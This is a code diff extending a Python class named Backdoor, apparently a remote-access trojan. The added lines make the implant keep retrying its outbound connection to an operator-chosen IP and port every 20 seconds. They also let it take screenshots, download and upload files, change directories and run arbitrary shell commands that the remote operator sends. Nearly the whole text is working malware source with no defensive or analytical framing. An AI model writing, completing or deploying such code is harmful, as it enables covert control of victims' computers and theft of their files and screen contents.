@@ -2,12 +2,29 @@ import socket
 import subprocess
 import json
 import sys
+import os
+import time
+import pyautogui
 
 
 class Backdoor:
     def __init__(self, ip, port):
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.connection.connect((ip, port))
+        self.ip = ip
+        self.port = port
+        self.connect()
+
+    def connect(self):
+        while True:
+            try:
+                self.connection.connect((self.ip, self.port))
+                break
+            except Exception:
+                time.sleep(20)
+
+    def screenshot(self):
+        screen = pyautogui.screenshot()
+        screen.save('scr.png')
 
     def command_exec(self, command):
         return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).rstrip()
@@ -29,13 +46,48 @@ class Backdoor:
             except ValueError:
                 continue
 
+    def write_file(self, name, data):
+        with open(name, 'wb') as file:
+            file.write(data.encode("ISO-8859-1"))
+            return 'File downloaded successfully'
+
+    def read_file(self, path):
+        try:
+            with open(path, 'rb') as file:
+                return file.read()
+        except Exception:
+            return ''
+
     def run(self):
         while True:
             command = self.receive_data()
             data = None
 
             try:
-                data = self.command_exec(command)
+                if command[0] == 'exit':
+                    self.connection.close()
+                    sys.exit()
+
+                elif command[0] == 'download':
+                    file = self.read_file(command[1])
+                    data = file
+
+                elif command[0] == 'upload':
+                    self.write_file(command[1], command[2])
+                    data = 'Uploaded succesfully'
+
+                elif command[0] == 'screenshot':
+                    self.screenshot()
+                    data = self.read_file('scr.png')
+                    os.remove('scr.png')
+
+                elif command[0] == 'cd' and len(command) > 1:
+                    os.chdir(command[1])
+                    data = f'Directory has been changed to {os.getcwd()}'
+
+                else:
+                    data = self.command_exec(command)
+
             except Exception as exc:
                 data = f'Error during command execution: {exc}'
 
